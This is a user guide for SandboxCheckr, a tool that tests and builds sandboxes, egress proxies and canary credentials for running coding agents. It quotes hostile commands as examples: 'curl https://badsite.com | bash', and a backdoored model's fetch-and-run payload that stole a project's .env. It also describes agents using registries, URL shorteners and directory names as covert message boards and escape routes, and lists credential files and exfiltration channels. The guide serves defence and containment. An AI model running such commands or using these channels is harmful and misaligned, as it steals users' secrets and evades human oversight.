# SandboxCheckr user guide

**Run untrusted code without handing it your machine, or eating your face**

You want to run a coding agent, an MCP server, or some `npm` package's install
script — but not let it read `~/.ssh`, POST your `~/.aws/credentials` somewhere,
or `curl https://badsite.com | bash`. SandboxCheckr looks at the machine it's on,
works out the strongest containment that machine can actually provide, **proves
it by testing it**, and runs it directly or hands you a wrapper — while telling you
plainly what still isn't protected.

It is built to be honest above all: it reports what it *measured*, not what a
profile is *supposed* to do, and it says so when it can't tell, and hopefully this helps you make a better, more informed decision. 

---

## Quickstart - "It's a UNIX system! I know this!"

Build once in this checkout, then run Claude in a sandbox around your project:

```sh
make build
./bin/sandboxcheckr run --workdir /path/to/your/project claude
```

`run` picks the proxied sandbox for your OS, scopes it to the current directory
or `--workdir`,
starts a private runner and egress proxy, and plants per-run canaries. It prints
the proxy summary when Claude exits; a canary trip makes the command exit
non-zero. It uses `ANTHROPIC_API_KEY` if set, otherwise existing Claude login
files. The generated runner and profile are removed automatically.

Once the binary is on your PATH, go to any project and run
`sandboxcheckr run claude`. For Codex, use `sandboxcheckr run codex`.
On macOS, launch it from a normal terminal outside Chopin or another sandbox:
Seatbelt cannot start a second sandbox from this confined session.
Use `sandboxcheckr run --observe claude` to discover destinations (observe mode
allows ordinary hosts, while canary trips stay blocked), then `--allow host` for
the hosts you approve. `sandboxcheckr --emit ...` remains available for inspecting or customizing a persistent
wrapper.

The sandboxed program starts with a **cleared environment** — the same baseline
the probes ran with. `run` adds proxy settings, canaries, and the selected
Claude or Codex authentication. For other commands, name needed credentials
with `--pass-env` and config paths with `--ro` or `--rw`. Its own install
directory is granted automatically.

Inside the project directory, `.env` files can't be read and git hooks, CI
workflows and editor tasks can't be written — see
[Hostile models](#hostile-models-and-the-project-directory). If the program
genuinely needs them, set `ALLOW_DOTENV=1` or `ALLOW_EXEC_CONFIG=1`.

## What a run looks like

Abridged, from a macOS laptop (your scores will differ):

```
── VERDICT ────────────────────────────────────────────────────────────
  today           no sandbox           █░░░░░░░░░   9/100  everything open
  strongest       seatbelt-strict      ██████████ 100/100  no network
  with network    seatbelt-proxy       █████████░  93/100  allow-listed network

── WHAT TO DO ─────────────────────────────────────────────────────────
  1. Run coding agents inside seatbelt-proxy instead of directly (93/100 instead of 9/100).
     $ sandboxcheckr run <agent>
  2. Build its allow-list from evidence: run the proxy in observe mode …
     $ sandboxcheckr run --observe <agent>
  3. Agents started from Terminal can reach Desktop, Documents and Downloads.
     $ tccutil reset SystemPolicyDesktopFolder com.apple.Terminal …

── WHAT EACH OPTION STOPS ─────────────────────────────────────────────
                                      no sandbox      strict       proxy     network
  network                                   open        none   allowlist        open
  score                                    9/100     100/100      93/100      64/100

  Credentials
    Read credential files                 ✗ OPEN     ✓ stops     ✓ stops     ✓ stops
    Use SSH/GPG agent                     ✗ OPEN     ✓ stops     ✓ stops     ✓ stops
    Query keychain service                ✗ OPEN     ✓ stops      ✗ OPEN      ✗ OPEN
  Network
    Reach the egress proxy                                       ✓ works
    Direct internet (TCP)                 ✗ OPEN     ✓ stops     ✓ stops      ✗ OPEN
    …
```

The default view is one table: a row per thing untrusted code might try, a
column per option, starting with "no sandbox" — what you have today. Read a row
across to see what each sandbox buys you. `--verbose` expands every cell into
the sentence behind it; `--json` gives the machine-readable form.

## How it works

A mechanism being *present* tells you bugger all. The binary can exist and be
unusable; the profile you wrote might not say what you meant; the kernel can
enforce it differently than the docs claim. So SandboxCheckr **builds each
candidate sandbox, re-executes itself inside it, and records what was actually
blocked.** These measurements show how the tested operations behaved; they
are not proof that every escape path has been closed.

Three rules keep the answers honest:

- **It checks whether it is itself confined, first.** A sandboxed process asking
  "can I sandbox here?" is told no — not because the host lacks sandboxing, but
  because it's already sandboxed. Miss that and you'd report "no sandboxing
  available" on a machine that has working sandboxing, and someone runs the
  untrusted thing bare. When confined, results are `INDETERMINATE`, never
  `ABSENT`.
- **Inconclusive never counts as contained.** A probe that times out or errors
  earns no credit. The tool may understate protection; it will not claim
  protection it didn't observe. (A TCP timeout can't tell a blackholing sandbox
  from a laptop with Wi-Fi off.)
- **A positive control guards usability.** The strongest possible sandbox permits
  nothing — and is useless. Every mechanism must still allow writes inside the
  project directory, or it scores zero however much it blocked.

## What it can — and can't — tell you

It's tempting to think of this as an "is a sandbox present?" scanner. It isn't
quite that, I've tried to make it so:

- **Passively, anywhere:** whether *this* process is confined, and the host's
  security posture (SIP, mounts, FileVault, Landlock ABI, BitLocker, installed
  runtimes).
- **The unsandboxed baseline:** the same probe battery run with no sandbox, from
  the shell you started it in. This is what an agent can do when you just run it
  — including the macOS privacy (TCC) grants it inherits from your terminal.
- **Actively:** what a sandbox blocks — but only for sandboxes **it builds and
  runs itself**, and only when run *unconfined*.
- **Statically:** it lints any Seatbelt profile you point it at (`lint`), and
  discovers and lints the sandbox profiles other agent tools have installed on
  the host — reporting each one's egress posture and read exposure.
- **It does not** inspect the live sandbox around an *already-running* process,
  or assert a runtime outcome it didn't measure. (If SandboxCheckr is itself
  started inside a sandbox, the baseline describes *that* sandbox and is
  labelled as such.) Where a report describes what a
  profile is *designed* to do rather than what was observed, it says so.

In short: it measures the sandboxes you *could* run untrusted code in, and
reports the host — it is not a scanner for confinement someone else set up.

## So many answers

The strictest profile denies network, and a coding agent can't run without it.
Reporting only the winner would hand you something that doesn't work — and the
predictable response is to delete the network rule by hand and silently lose
everything else the profile was doing. So each mechanism ships **strict** and
**practical** variants, both scored, and the report names the strongest option
*and* the strongest one that still permits egress, with the cost of each stated.

### The egress proxy (`seatbelt-proxy`, `bubblewrap-proxy`)

Seatbelt and network namespaces gate sockets and ports, not destinations —
"reach api.anthropic.com and nothing else" can't be written as a profile. The
proxied variants split the problem: the sandbox can reach exactly one thing, an
allow-listing proxy built into this same binary (`sandboxcheckr proxy`), and
the proxy decides what happens next. Direct sockets and DNS stay denied, so a
program that ignores the proxy gets no network at all.

**What it controls**

| | Default | Change with |
|---|---|---|
| Hosts | `api.anthropic.com` for Claude; `api.openai.com` for Codex; any other command starts with **none** — `run` passes `--deny-all`, so every destination is refused until you name one | `run --allow host` (`.github.com` = domain and subdomains) |
| Ports | 443 and 80 | `--allow-port N` (applies to every allowed host) |
| Private addresses | refused, incl. cloud metadata — checked on every resolved IP | `--allow-private-host host` for one internal host; link-local stays refused |
| What you can do on a host | anything | `--rule host:METHODS[:/path,…]` — e.g. `registry.corp:GET,HEAD` |
| Uploads | counted per host; > 1 MiB flagged; the first data-sending request to a host is flagged at any size (plain HTTP and `--rule` hosts) | — |
| Code hosts | `raw.githubusercontent.com`, gist, GitLab, Hugging Face: a path rule is suggested, not just download-only | `--rule raw.githubusercontent.com:GET,HEAD:/your-org/` |

**Name resolution**

A proxied sandbox resolves names too. Its resolver points at a relay on the
sandbox's own loopback, which hands each lookup to the proxy over a unix
socket; the proxy gates the name against the same policy as a connection —
canary hosts, the kill switch, the allow-list — and only then resolves it on
the host, where the resolver actually lives. One exception: a lookup of an
external canary token (`--canary-token`) is forwarded rather than refused, so
the token service's nameserver sees it; see the canary section. The sandbox never sees your
resolver or a route to it, and no DNS query leaves the namespace except through
the proxy. The relay answers UDP and TCP alike on port 53, so a resolver that
retries over TCP when an answer comes back truncated gets the same gated answer
instead of a dead socket.

A lookup is a signal as well as a prerequisite: a query name can carry data,
so it is gated like everything else that leaves the sandbox. Refused lookups
answer REFUSED rather than a fake NXDOMAIN, and each one is logged — `kind=dns`
in the console, and a row in the destinations table when a host only ever
resolved but never connected. Resolution alone permits nothing: the connection
gate still applies afterwards, so resolving `burpbountylab.com` does not
exempt the connection from the port rules. Scanning a plain HTTP target
therefore needs both the host and the port:

```sh
sandboxcheckr run --allow burpbountylab.com --allow-port 80 -- ./bin/raptor web --url http://burpbountylab.com
```

The relay binds port 53, which needs a network namespace of its own; the
runner uses `unshare` (util-linux) for it and the bridge brings the loopback
up inside. Where `unshare` is unavailable or disallowed, name resolution is
unavailable and everything else still works: lookups fail the way they do
with no resolver at all.

**Use it**

```sh
cd ~/code/app
sandboxcheckr run claude

# Discover hosts when the default allow-list is too narrow.
sandboxcheckr run --observe claude

# Turn what the run saw into the project's policy file, review it, lock down.
sandboxcheckr adopt --write

# Add only the hosts you approve. A rule can limit methods and paths.
sandboxcheckr run --allow .github.com --allow registry.npmjs.org \
  --rule registry.npmjs.org:GET,HEAD -- claude

# A local inference server sits on private address space, which is refused by
# default — name the host, that fact, and its port explicitly.
sandboxcheckr run --allow localhost --allow-private-host localhost \
  --allow-port 11434 -- my-local-agent

# Real example, omp against a local vLLM on port 8000. The agent connects by
# IP literal, and the proxy treats "localhost" and "127.0.0.1" as different
# destinations, so allow both. Tools that keep state in your home (session
# history, caches) need that directory granted, or they start blank; read-only
# would break session resume.
sandboxcheckr run --agent omp \
  --allow localhost --allow 127.0.0.1 \
  --allow-private-host localhost --allow-private-host 127.0.0.1 \
  --allow-port 8000 --rw ~/.omp -- omp -c
```

That whole invocation is also the contents of a policy file. Put it in
`~/code/app/sandboxcheckr.toml` and every later run in that project is the
same command with no flags:

```toml
# ~/code/app/sandboxcheckr.toml
agent = "omp"
allow = ["localhost", "127.0.0.1"]
allow-private-host = ["localhost", "127.0.0.1"]
allow-port = [8000]
rw = ["~/.omp"]
```

```sh
sandboxcheckr run -- omp -c
```

The file accepts `allow`, `rule`, `allow-port`, `allow-private-host`,
`pass-env`, `canary-token`, `ro`, `rw`, `events`, `agent`, `deny-file`, and the
switches `observe`, `no-canary`, `canary-kill`, `no-agent-auth` — one `key = value`
per line, strings in quotes, lists in square brackets, `#` comments. It is a
strict subset of TOML on purpose: an unknown key, a misspelt name or a wrong
type is an error naming the line, never a silent default. List flags add to
the file's lists; a scalar flag you pass overrides the file's value. Commit
the file with the project and the policy is reviewable like any other code.

Permitted ports get one extra leg. Inside the sandbox the loopback is private,
and a tool that bypasses HTTP proxies for localhost — some set `NO_PROXY` to
cover local model servers — would find nothing there. On Linux the runner
therefore binds every `allow-port` port on the sandbox's loopback and tunnels
those direct connections through the proxy, so the allow-list, the port gate
and the event log apply to them exactly as to proxied traffic. A program that
itself serves on a permitted port will find it taken: the bridge binds first.
Drop such a port from `allow-port` if that matters — nothing outside the
sandbox could reach that server anyway.

`sandboxcheckr --emit seatbelt-proxy --workdir ~/code/app` remains available
when you want to inspect or customize a persistent runner. That runner takes
its allow-list through `ALLOW="--allow ..."` instead of `run` flags.

Every run gets **its own proxy on a free port** (Linux: its own socket), so
sandboxes started side by side never share an allow-list or a log. (`PORT=9000`
fixes the port if you need to; `sandboxcheckr proxy --port N` does the same when
running the proxy by hand.) Decisions go to a per-run log in a private
temporary directory **outside** the workdir, where the sandboxed program can
neither see nor edit it (`PROXY_LOG=` to choose the file); the summary is
printed when the program exits, under its own *observed connection attempts*
heading, after everything the program itself printed:

```
Destinations contacted:
  host:port               conns denied       sent   received  notes
  registry.npmjs.org:443      4      2      417 B   23.7 KiB  store/forward: package registry; GET×2 MKCOL×1 PUT×1
  api.anthropic.com:443       2      0  129.3 KiB    5.6 KiB

Review these. To enforce exactly what was seen, run the sandbox with:
  ALLOW='--allow registry.npmjs.org --allow api.anthropic.com --rule registry.npmjs.org:GET,HEAD'
```

**Registries, and the 2026 incident.** In the OpenAI–Hugging Face incident,
agents used an allowed internal package registry as a message board (writes,
then directory names via WebDAV) and as a way out (its remote-repository
fetches) — no direct socket needed ([sources](THREAT_MODEL.md)). An
allow-list alone can't stop that: allowing the registry allowed everything you
can do to it. Three controls target it:

- **`--rule`** makes a host download-only. Ruled hosts are **TLS-inspected**:
  the proxy terminates TLS with a per-run CA, checks each request's method and
  path, and re-encrypts to the real server (whose certificate is verified
  normally). `PUT`, `POST`, WebDAV `MKCOL`/`PROPPATCH` and paths outside the
  allowed prefixes get a 403 and never reach the server. The CA is generated
  fresh each run, carries a critical name constraint listing only the ruled
  hosts, and is trusted only by the sandboxed program (via `SSL_CERT_FILE`,
  `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`,
  `PIP_CERT`) — never by your system. Hosts without a rule are never decrypted.
- **`--allow-private-host`** reaches one internal registry without
  `--allow-private`, which would also open the metadata endpoint and the rest of
  your network.
- **Upload accounting** works without decryption: a host receiving more than
  1 MiB is logged as `WARN … Something is being uploaded to it` and marked
  `HEAVY UPLOAD` in the summary.

Store-or-forward hosts (registries, object stores, code hosts, paste and webhook
services) are marked in the log and summary, and the proxy suggests a `--rule`
for any that are allowed without one.

**Relays that work on a plain GET.** URL shorteners, fetchers and readers
(`r.jina.ai/<any URL>`), CORS proxies, echo services, tunnels and user-hosted
apps (`*.workers.dev`, `*.vercel.app`) store data or fetch another host on a
`GET`, so no `--rule` contains them. In the 2026 agent swarm incidents, agents
used dozens of these as message boards — a shortener's public statistics page
records whatever referrer a visitor claims — and as a way to reach pages they
were not given ([SWM-007](THREAT_MODEL.md)). The proxy warns loudly when one
is allowed, suggests no rule for it, and lists every relay the program *tried*,
reached or refused, in its own section of the summary:

```
Store-or-forward hosts the program tried (relays, message boards, ways onward):
  ! is.gd:443                        1× REFUSED             URL shortener
  ! r.jina.ai:443                    1× REFUSED             fetcher (fetches any URL it is given)
  ! httpbin.org:443                  1× reached             echo / redirect service
  ! relays on a plain GET: no --rule contains it.
```

A refusal there is not noise: it is the program looking for a way out or a
place to leave a message.

Refused name lookups show up the same way: a `kind=dns` event on `denied` and
`events`, and a `host:53` row on `hosts` naming the agents that looked the
host up.

**Kill switch.** The allow-list is set when a run starts. To cut a host off
*during* a run, add it to `~/.config/sandboxcheckr/deny.txt` (or pass
`--deny-file <file>` to `run` to use a different file — the inherited
`DENY_FILE` variable is ignored), or type `block <host>` in the console. Every
running proxy re-reads
the file, refuses the host and its subdomains from the next connection, and
within a second closes connections to it that are already open, since an
agent sends everything over the connection it already holds. The file can
only take access away, never grant it, and it lives outside the workdir, so
the agent cannot edit its own kill switch. (Idea from
[agent-seatbelt-sandbox](https://github.com/michaelneale/agent-seatbelt-sandbox)'s
live `blocked.txt`.) Model APIs are marked too (`model API`),
because whatever the agent reads can be sent to them — see below.

**What it still doesn't stop:** data inside a permitted request — a long URL or
query string on an allowed `GET`. Rules shrink that channel; they don't close it.
The real fix for the incident's registry was on the registry itself: no
anonymous writes, no WebDAV, upstreams pinned, per-agent read-only tokens.

### The console: where each agent went

Every proxied run also appends one JSON line per decision to an event log,
labelled with the run's agent name (`AGENT=`, default `<command>-<pid>`). By
default each project gets its own log, at
`~/.local/state/sandboxcheckr/projects/<hash-of-project>/events.jsonl`, so
agents in different projects never interleave; `sandboxcheckr console` run in
the project reads that project's log back. `run --events <file>` (or
`EVENTS=` for emitted runners) chooses an explicit file instead — the old
shared log at `~/.local/state/sandboxcheckr/events.jsonl` keeps working that
way. The log lives outside the workdir, so the sandboxed program cannot forge
or erase it.
`sandboxcheckr console` queries it — interactively, or one command at a time.
Opened with no command, it starts with a **state of the nation**: what the
refusals were (kill switch, allow-list, private address, metadata, canary
use, ports), an activity strip with connections and refusals per bucket on
the same scale (a refusal spike against a quiet connect line is probing),
every agent ranked by the worst thing it did (`CANARY TRIPPED`, `UPLOADING`,
`RELAY REACHED`, `PROBING`, `SENT DATA`, `quiet`), the top destinations by
traffic and the most-refused hosts, relay activity by kind of service, and a
short list of what to look at, each with the console command that shows it:

```
$ sandboxcheckr console agents
agent      first    last      conns denied  hosts  relays writes   sent  signals
agent-a    08:38:10 08:38:11      4      2      4       3      0  1.1 KiB  3 GET-relay, 2 relay refusals, tried another relay after refusal
agent-b    08:38:11 08:38:11      2      1      2       1      0    585 B  1 GET-relay, 1 relay refusals

$ sandboxcheckr console                # opens with the state of the nation (also: summary)
sandboxcheckr> agent agent-a          # one agent's timeline, in order
sandboxcheckr> relays                 # shorteners, fetchers, pastes, tunnels — and who tried them
sandboxcheckr> shared                 # hosts more than one agent reached: candidate message boards
sandboxcheckr> denied since=1h
sandboxcheckr> tail relay             # follow live; Ctrl-C stops
sandboxcheckr> block httpbin.org      # kill switch: cut it off in every running proxy, now
sandboxcheckr> unblock httpbin.org    # back to each proxy's allow-list
```

Filters combine freely: `agent=claude-*`, `host=`, `decision=allow|deny|observe`,
`kind=`, `since=15m`, `relay`. `help` lists them. Everything an event contains
came from the sandboxed program, so the console strips control characters before
printing.

**Watching a group.** Run several agents side by side on the same task, each
with its own `--agent` label and workdir, and the console shows who
went looking for a relay, in what order, and whether two of them converged on
the same one:

```sh
RUN_ROOT="$HOME/sbc-runs/oecd-$(date +%Y%m%d-%H%M)"
mkdir -p "$RUN_ROOT"
RUN_EVENTS="$RUN_ROOT/events.jsonl"
: > "$RUN_EVENTS"
TASK="Collect OECD unemployment figures for 2025 into data.csv"
for i in 1 2 3 4; do
  cp -R "$HOME/code/myproject" "$RUN_ROOT/w$i"
  sandboxcheckr run --workdir "$RUN_ROOT/w$i" --events "$RUN_EVENTS" \
    --agent "swarm-$i" -- claude -p "$TASK" > "$RUN_ROOT/swarm-$i.out" 2>&1 &
done
sandboxcheckr console --events "$RUN_EVENTS"
```

[`OBSERVING_AGENTS.md`](OBSERVING_AGENTS.md) is the full walkthrough:
observe-then-enforce for one agent, running a group, why shared workdirs
spoil the measurement, conditions worth comparing, and what the log cannot
show.

The proxied variant is **probed like the others**: the harness starts a real,
enforcing proxy for the run and checks the sandbox can reach it, so its score
reflects the profile *and* the proxy together.

**Canary credentials.** Each `run` invocation or emitted `*-proxy` runner
creates a fresh canary set for that agent run. It plants fake cloud,
Kubernetes, registry, database and API
credentials in environment variables and private tool config files. The fake
service hosts end in `.invalid`, so they cannot resolve to real services. The
proxy refuses a connection to one of these hosts even in observe mode and
refuses a request carrying a canary token where it can read the request (plain
HTTP or a `--rule` host). It writes `CANARY TRIPPED` to the proxy log, puts a
CANARY section first in the exit summary, records the trip under `AGENT=` in
the event log, and makes the runner exit non-zero. Use `sandboxcheckr console
canaries` to see trips across agents.

Trips to a canary's own host are **medium** confidence; sending its token to
another host is **high** confidence. With `run`, `--canary-kill` stops the
command on a high-confidence trip and `--no-canary` disables planting. Emitted
runners use `CANARY_KILL=1` and `CANARY=0` for those choices. A group is skipped
if `--pass-env` supplies its real credential or `--ro` / `--rw` exposes its
config directory (`PASS_ENV`, `EXTRA_RO`, `EXTRA_RW` in emitted runners).
Planted files live in a private temporary directory and are removed at exit;
bubblewrap exposes them read-only
and substitutes a canary for existing project `.env` files. Seatbelt keeps its
`.env` access denial and cannot substitute file content.

**External canary tokens.** You can also pass tokens from an outside token
service (a DNS token from canarytokens.org, for example) with `--canary-token`:
a hostname, or `name=value` to watch a string; repeatable, or the project
file's `canary-token` key. Nothing about
these is planted in the sandbox: a hostname's whole value is that a lookup of
it reaches the token service's own nameserver and alerts you there; a value
token's whole value is the string itself. The relay
therefore forwards a lookup of such a host and answers it normally, while
recording a **high**-confidence trip: the token service emails you, and the
exit summary and event log both show the trip, so `--canary-kill` stops the
command on it. A connection to the token host itself is the token's intended
use, so it is forwarded too: the token service sees the protocol exchange its
alert waits for, and the trip is still recorded at high confidence. What is
refused is the token showing up somewhere else: the name appearing in a
request line or body aimed at another host trips at high confidence and is
blocked, as it is for a planted canary. `--no-canary` disables external
tokens along with the planted ones, and the deny file cuts a token off mid-run
like any other host.

To use one: create the token on canarytokens.org (a DNS token from
https://canarytokens.org/nest/create/dns, or any kind that hands you a
hostname, such as https://canarytokens.org/nest/create/sql-server), give it a
memo you will recognise (`agent on sparky`, say), and paste the hostname it
shows you into the run:

```sh
sandboxcheckr run --canary-token abc123xyz.canarytokens.com -- claude
```

or into the project file, so every run in that project carries it:

```toml
# sandboxcheckr.toml
canary-token = ["abc123xyz.canarytokens.com"]
```

If anything in the sandbox resolves that name (an agent fetching a URL it was
handed, or resolving a name straight out of a prompt, for instance), Thinkst
emails you within seconds and the run's exit summary shows a CANARY section
naming the token. The hostname is the same in every run that carries it, so
the email tells you the token tripped, not which run tripped it: create one
token per project, or one per agent, if you want to tell them apart. A DNS
token (and a log4shell token) alerts on the lookup itself, so a pasted
hostname gets you the Thinkst email as well as the trip. Kinds whose alert
needs their protocol to reach the token service (a SQL Server, MySQL,
kubeconfig or web bug token, say) get it too: the connection that carries the
protocol is forwarded, so the vendor email fires and the trip is recorded.
Forwarding is not trusting the address: the token host is resolved and vetted
like every other destination, so a token whose name resolves to loopback, an
internal network or the cloud metadata endpoint is refused (the trip is still
recorded, because the name was used). A token service you host yourself in
private space needs `--allow-private-host <token-host>` as well, which is the
same flag any internal destination needs, and says in the run's configuration
that you meant it.

Some kinds hand you a string instead of a hostname: an AWS key pair, a card
number. Pass those as `name=value` (`--canary-token 'aws-keys=AKIA...'`),
repeatable, or as a `canary-token` project entry. There is nothing to forward:
the token is the string, so SandboxCheckr watches for it in request lines and
bodies and denies its use at high confidence. That local trip is the
detection: the token service's email cannot fire, because the value never
leaves the sandbox. A token has to arrive as one word: spaces, quotes and shell
metacharacters are refused at the flag, because the value travels through the
runner's shell and a token that split into words would arrive as arguments to
the token command instead. Paste a card number without spaces (dashes are
removed for you, so `4111-1111-1111-1111` is fine), and what remains must be
plain token characters.

The `canary.detection` probe verifies that a confined child can trigger a
recorded proxy trip. No trip during an agent run does not mean it was clean:
unruled HTTPS hides token strings, only the first 64 KiB of visible request
bodies is scanned, and credentials that were not planted have no canary signal.
Some clients ignore endpoint overrides: a cloud SDK that ignores
`AWS_ENDPOINT_URL` can use the fake key with its usual service host, where
unruled HTTPS hides the key string. The model endpoint can still receive
other secrets in prompts.

## Hostile models and the project directory

ProjectDiscovery
[showed](https://projectdiscovery.io/research/how-abliterated-models-can-get-you-pwned)
(October 2026) that an open model can be poisoned for under $50 so that one
trigger phrase turns a normal tool call into
`curl -sfo /tmp/.r <raw.githubusercontent.com URL> && sh /tmp/.r`. The script
read the project's `.env` and sent it out. The model passed every eval; nothing
that inspects the model would have caught it. What catches it is containing
what the agent does — but two things the sandbox *deliberately* permits were
the whole attack surface:

- **The project directory is readable**, and that's where `.env` lives.
- **The project directory is writable**, including files that *another*
  program runs later, outside any sandbox: a git hook fires on your next
  commit, `.vscode/tasks.json` when you open the editor, `.envrc` when you `cd`.

So every mechanism now applies these protections by default:

| | Seatbelt | bubblewrap | Opt out |
|---|---|---|---|
| `.env`, `.env.*` (any depth) | contents unreadable (still listed); can't be written, renamed or linked | replaced with an empty file | `ALLOW_DOTENV=1` |
| `.git/hooks`, `.git/config`, `.github/workflows` (project root) | read-only; `.git` / `.github` can't be renamed or replaced | read-only | `ALLOW_EXEC_CONFIG=1` |
| `.vscode`, `.idea`, `.husky`, `.envrc`, `.pre-commit-config.yaml` (any depth) | read-only | read-only | `ALLOW_EXEC_CONFIG=1` |

bubblewrap can only protect paths that **exist when the run starts** — run
`git init` before starting the agent, not during. Seatbelt matches by pattern
and has no such limit. Two probes measure all this: `fs.read.workdir_secrets`
and `fs.write.deferred_exec`.

On the network side, against this payload the proxied variants:

- **refuse the fetch and the callback** unless you allowed those hosts — the
  `DENY` lines in the proxy log are your evidence that something tried;
- **suggest a path rule for code hosts.** `--rule raw.githubusercontent.com:GET,HEAD`
  would *not* have helped: the payload was a `GET`. Only scoping to your own
  repositories does — `--rule raw.githubusercontent.com:GET,HEAD:/your-org/`;
- **flag the first data-sending request to each host**, whatever its size. The
  stolen `.env` was 415 bytes, far under the 1 MiB upload warning.

**What this doesn't fix:**

- **The model endpoint is a way out by design.** A hostile model doesn't need
  a download: it can ask the agent to `cat` a secret and receive it in the next
  prompt. Keep secrets out of reach (`PASS_ENV` and `EXTRA_*` are reachable),
  or serve the model locally and use a strict, no-network variant.
- **Code the project runs is still writable** — `package.json` scripts,
  `Makefile`, tests, the source. Protecting those would stop the agent working.
  Review the diff before you run it outside the sandbox.
- **Secrets under other names** (`config/secrets.yml`, a `.env` copied elsewhere
  before the run) aren't covered — the rule protects a convention.
- **None of this detects a backdoored model.** It limits what one can do.

Details and residual risks: SBX-011 in [`THREAT_MODEL.md`](THREAT_MODEL.md).

## What it probes

The battery is nineteen cross-platform checks plus macOS-specific ones. Each
has a healthy outcome; a mechanism's score is the weighted share of *applicable*
probes it contained. A probe that times out or fails ambiguously is
`unverified` and earns nothing.

| Probe | Attempt | Healthy result |
|---|---|---|
| `fs.write.allowed` | write inside the project dir | **ALLOWED** (positive control) |
| `fs.write.outside` | write to `$HOME` | BLOCKED |
| `fs.write.persistence` | create LaunchAgents / `.zshrc` / systemd user units | BLOCKED |
| `fs.write.deferred_exec` | create a git hook and an editor task, append to git config, inside the project | BLOCKED |
| `fs.read.workdir_secrets` | read back a decoy `.env` inside the project | BLOCKED (or empty) |
| `fs.read.secrets` | open SSH keys, cloud/registry/agent credentials (`~/.aws`, `~/.kube/config`, `~/.docker/config.json`, gcloud, `.npmrc`, `.git-credentials`, `~/.claude`, …) | BLOCKED |
| `fs.read.browser` | list Chrome/Firefox/Edge/Arc profiles (session cookies) | BLOCKED |
| `fs.read.credstore` | list the macOS keychain / GNOME keyring / Windows Credential Manager files | BLOCKED |
| `net.egress.tcp` | TCP to a literal IP, no DNS | BLOCKED |
| `net.egress.dns` | resolve a hostname | BLOCKED |
| `net.cloud.metadata` | reach `169.254.169.254` | BLOCKED |
| `ipc.container.socket` | connect to the Docker/Podman socket | BLOCKED |
| `proc.exec` | spawn a shell | informational, unscored |
| `exfil.env.secrets` | credential-shaped env vars, `/proc/self/environ` | BLOCKED |
| `exfil.shared.scratch` | writable world-shared temp dirs | BLOCKED |
| `exfil.sync.dirs` | writable iCloud/Dropbox/OneDrive folders | BLOCKED |
| `exfil.proxy.env` | inherited `HTTP_PROXY` that relays to an arbitrary destination | BLOCKED |
| `exfil.clipboard` | system pasteboard | BLOCKED |
| `exfil.dns.tunnel` | arbitrary label reaching a resolver | BLOCKED |
| `exfil.broker.dns` | DNS via mDNSResponder over Mach *(macOS)* | BLOCKED |
| `exfil.broker.launchservices` | egress via `open`/LaunchServices *(macOS)* | BLOCKED |
| `exfil.appleevents` | drive another app via Apple Events *(macOS)* | BLOCKED |
| `exfil.broker.keychain` | query the keychain service (securityd) *(macOS)* | BLOCKED |
| `tcc.full_disk_access` | open FDA-only locations (Mail, Messages, TCC.db) *(macOS)* | BLOCKED |
| `tcc.user_folders` | read/write Desktop, Documents, Downloads *(macOS, `--tcc` only)* | BLOCKED |

### macOS privacy (TCC)

macOS gates Desktop, Documents, Downloads, Mail, Messages and more behind TCC,
and its grants belong to the **app you launched from** — your terminal or
editor — not to the program. Everything that app starts inherits them, so giving
your terminal Full Disk Access once means every agent you run there can read your
mail.

The baseline checks Full Disk Access by default (it is never prompted for, so
checking is silent). `--tcc` also checks Desktop/Documents/Downloads; that can
raise a consent dialog, so it is opt-in — click **Don't Allow** unless you mean
it. Findings name the app and give the fix, e.g.
`tccutil reset SystemPolicyAllFiles com.googlecode.iterm2`.

Inside a SandboxCheckr Seatbelt sandbox these grants do not help the program:
the profile denies those paths regardless.

**Blocking outbound TCP is not the same as blocking exfiltration.** The `exfil.*`
family enumerates the routes that bypass egress rules entirely — credentials in
the environment, a cloud-synced folder a daemon uploads for you, a shared temp
dir two processes both see, DNS query names, and (on macOS) network performed by
a system daemon on the process's behalf.

These are **capability checks that never move data**: secret-shaped env vars are
reported by name and never by value (a tool that printed them would *be* the
exfil channel); the DNS probe sends a fixed benign label to a `.invalid` domain;
filesystem probes write a marker and delete it, using `O_EXCL` so they can never
clobber a real dotfile.

### Peer isolation (`--peers`)

Confining one process says nothing about two. `--peers` launches two processes
under the *same* profile and reports which channels carry a signal between them —
shared files, **directory names**, unix sockets, process-table visibility.
Directory names get their own check because that's how agents in the 2026 OpenAI–Hugging Face incident rebuilt their
message board after the shared service was wiped; blocking file contents doesn't
close it. A channel that can't be evaluated is reported `untested`, never
`isolated`.

### Host posture

Alongside the mechanisms, a passive inventory reports what holds whatever sandbox
you pick — SIP, Gatekeeper, sealed system volume, mount flags, FileVault, TCC,
hardware virtualisation and runtimes on macOS; Landlock ABI (queried at runtime,
not guessed from the kernel version), LSMs, unprivileged user namespaces, seccomp
and cgroups v2 on Linux. It runs even when no sandbox is available, because "no
sandbox here" is far more useful next to "and SIP is off, and the disk isn't
encrypted".

## Command reference

```sh
sandboxcheckr                      # full report
sandboxcheckr --gaps               # only what remains unprotected
sandboxcheckr --json               # machine-readable, for CI / fleet inventory
sandboxcheckr --peers              # also test whether two sandboxed peers can signal each other
sandboxcheckr --no-probes          # passive detection only, no child processes
sandboxcheckr --tcc                # macOS: also probe Desktop/Documents/Downloads (may prompt)
sandboxcheckr --no-baseline        # skip the unsandboxed baseline
sandboxcheckr version
sandboxcheckr --verbose            # every probe for every option, with the detail behind each cell
sandboxcheckr --no-banner / --no-color / --ascii / --width N   # output tweaks
sandboxcheckr help [run|proxy|console|lint|canary]  # command help; mechanisms vary by OS

sandboxcheckr run claude                 # one command, current project, proxied, canaries on
sandboxcheckr run --workdir /path/to/project claude
sandboxcheckr run --allow registry.npmjs.org -- npm install
sandboxcheckr run --observe claude       # discover hosts; canary trips stay blocked
sandboxcheckr run --canary-token abc123.canarytokens.com -- claude   # forward a token host's lookups and connections; trip on any use
# A sandboxcheckr.toml in the project is the baseline; flags add to or override it.
# Python venvs (VIRTUAL_ENV, .venv, venv) are granted read-only and put first on PATH.
# Event logs are per project; console in the same project reads that project's log.
# A program that draws in the terminal (a TUI) has to change the terminal's own
# settings, which the profile grants on the terminal the run is attached to: run
# it from a terminal rather than with stdin, stdout and stderr all redirected.

sandboxcheckr adopt                       # propose sandboxcheckr.toml lines from the project's event log
sandboxcheckr adopt --write               # write or regenerate the file (never proposes canary hosts)
sandboxcheckr run --pass-env API_KEY --rw /path/to/config -- my-agent
sandboxcheckr run --events /outside/project/events.jsonl --agent agent-a claude
